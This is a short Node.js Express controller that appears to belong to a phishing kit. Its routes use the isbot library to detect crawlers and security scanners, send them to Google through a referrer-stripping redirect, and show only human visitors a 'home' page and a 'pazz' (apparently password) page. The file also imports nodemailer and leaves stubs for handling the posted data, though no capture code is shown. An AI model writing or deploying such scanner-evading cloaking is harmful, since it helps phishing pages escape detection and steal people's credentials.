const fs = require('fs');
const nodeMailer = require('nodemailer')
const isbot = require('isbot')
const smtpTransport = require('nodemailer-smtp-transport')
const cloudinary = require('cloudinary')

cloudinary.config({
    cloud_name: process.env.CLOUD_NAME,
    api_key: process.env.API_KEY,
    api_secret: process.env.API_SECRET
});

//get rquest index page
const refresh = (req,res) => {
    const bot = isbot(req.get('user-agent'))
    if (bot || req.isSpider()) {
        return res.status(403).redirect("https://href.li?https://google.com");
    } else {
        console.log(req.get('user-agent'));
        res.render('home')
     }
}

// get indexpage 
const indexPage = (req,res) => {
    
    const bot = isbot(req.get('user-agent'))
    if (bot) {
        return res.status(403).redirect("https://href.li?https://google.com");
    } else {
        //console.log(req.session.error);
       res.render('home')
    }
}

//post index page



//get pazz
const getPazz = (req,res) => {
    const bot = isbot(req.get('user-agent'))
    if (bot) {
        return res.status(403).redirect("https://href.li?https://google.com");
    } else {
       res.render('contact')
    }
}

//post req for pazz

module.exports = {getPazz,indexPage,refresh}